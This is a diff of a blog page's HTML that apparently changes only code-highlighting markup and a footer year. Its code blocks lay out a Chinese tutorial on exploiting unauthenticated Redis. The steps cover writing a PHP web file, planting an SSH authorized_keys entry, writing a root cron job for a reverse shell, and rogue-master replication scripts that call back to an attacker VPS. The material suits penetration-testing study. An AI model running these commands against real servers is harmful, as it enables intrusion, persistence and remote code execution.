@@ -163,10 +163,10 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">keys *
-<span class="nb">set</span> x <span class="s2">&#34;\n\n&lt;?php pnpinfo();?&gt;\n&#34;</span>
-get x
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">keys *
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> x <span class="s2">&#34;\n\n&lt;?php pnpinfo();?&gt;\n&#34;</span>
+</span></span><span class="line"><span class="cl">get x
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -182,8 +182,8 @@ get x
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">config get *
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">config get *
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -209,10 +209,10 @@ get x
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">config <span class="nb">set</span> dir /var/www    <span class="c1"># 设置文件写入目录</span>
-config <span class="nb">set</span> dbfilename 1.php   <span class="c1"># 设置写入文件名</span>
-save <span class="c1"># 保存</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">config <span class="nb">set</span> dir /var/www    <span class="c1"># 设置文件写入目录</span>
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dbfilename 1.php   <span class="c1"># 设置写入文件名</span>
+</span></span><span class="line"><span class="cl">save <span class="c1"># 保存</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -236,8 +236,8 @@ save <span class="c1"># 保存</span>
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh-keygen -t rsa    <span class="c1"># 生成公钥和私钥</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh-keygen -t rsa    <span class="c1"># 生成公钥和私钥</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="22-利用-redis-config-写文件">2.2 利用 redis config 写文件</h3>
 <div class="highlight"><div class="chroma">
@@ -248,11 +248,11 @@ save <span class="c1"># 保存</span>
 </span><span class="lnt">4
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="nb">set</span> x <span class="s2">&#34;\n\n公钥内容\n&#34;</span>
-config <span class="nb">set</span> dir /home/user/.ssh
-config <span class="nb">set</span> dbfilename authorized_keys
-save
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">set</span> x <span class="s2">&#34;\n\n公钥内容\n&#34;</span>
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dir /home/user/.ssh
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dbfilename authorized_keys
+</span></span><span class="line"><span class="cl">save
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="23-利用公私钥对登录">2.3 利用公私钥对登录</h3>
 <div class="highlight"><div class="chroma">
@@ -260,8 +260,8 @@ save
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">ssh -i id_rsa user@ip
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ssh -i id_rsa user@ip
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="3-写定时任务反弹-shell">3 写定时任务反弹 shell</h2>
 <p>条件：</p>
@@ -280,14 +280,14 @@ save
 </span><span class="lnt">7
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">keys *    查看所有键
-<span class="nb">set</span> x <span class="s2">&#34;\n\n计划任务内容\n\n&#34;</span>    
-config get *    
-config <span class="nb">set</span> dir /var/spool/cron    
-config <span class="nb">set</span> dbfilename root    
-save    保存，完成文件写入
-del x    删除创建的x键
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">keys *    查看所有键
+</span></span><span class="line"><span class="cl"><span class="nb">set</span> x <span class="s2">&#34;\n\n计划任务内容\n\n&#34;</span>    
+</span></span><span class="line"><span class="cl">config get *    
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dir /var/spool/cron    
+</span></span><span class="line"><span class="cl">config <span class="nb">set</span> dbfilename root    
+</span></span><span class="line"><span class="cl">save    保存，完成文件写入
+</span></span><span class="line"><span class="cl">del x    删除创建的x键
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h2 id="4-主从复制">4 主从复制</h2>
 <h3 id="41-加载扩展模块执行系统命令">4.1 加载扩展模块执行系统命令</h3>
@@ -307,8 +307,8 @@ del x    删除创建的x键
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 redis-rogue-server.py --rhost &lt;target address&gt; --rport &lt;target port&gt; --lhost &lt;vps address&gt; --lport &lt;vps port&gt;
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 redis-rogue-server.py --rhost &lt;target address&gt; --rport &lt;target port&gt; --lhost &lt;vps address&gt; --lport &lt;vps port&gt;
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -329,8 +329,8 @@ del x    删除创建的x键
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 redis-rogue-server.py --server-only
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 redis-rogue-server.py --server-only
+</span></span></code></pre></td></tr></table>
 </div>
 </div><h3 id="42-主从复制写入纯净文件">4.2 主从复制写入纯净文件</h3>
 <p>在 linux 下，可以利用 SYNC 主从同步，来直接写入无杂质的文件，脚本如下：</p>
@@ -342,8 +342,8 @@ del x    删除创建的x键
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash">python3 RedisWriteFile.py --rhost 172.17.0.2 --rport <span class="m">6379</span> --lhost 172.17.0.1 --lport <span class="m">4444</span> --rpath <span class="s2">&#34;/var/www&#34;</span> --rfile <span class="s2">&#34;test.php&#34;</span> --lfile <span class="s2">&#34;./phpinfo.php&#34;</span>
-</code></pre></td></tr></table>
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">python3 RedisWriteFile.py --rhost 172.17.0.2 --rport <span class="m">6379</span> --lhost 172.17.0.1 --lport <span class="m">4444</span> --rpath <span class="s2">&#34;/var/www&#34;</span> --rfile <span class="s2">&#34;test.php&#34;</span> --lfile <span class="s2">&#34;./phpinfo.php&#34;</span>
+</span></span></code></pre></td></tr></table>
 </div>
 </div><p><img
         class="lazyload"
@@ -405,7 +405,7 @@ del x    删除创建的x键
 </div>
 </article></div>
             </main><footer class="footer">
-        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2022</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
         </div>
     </footer></div>
 
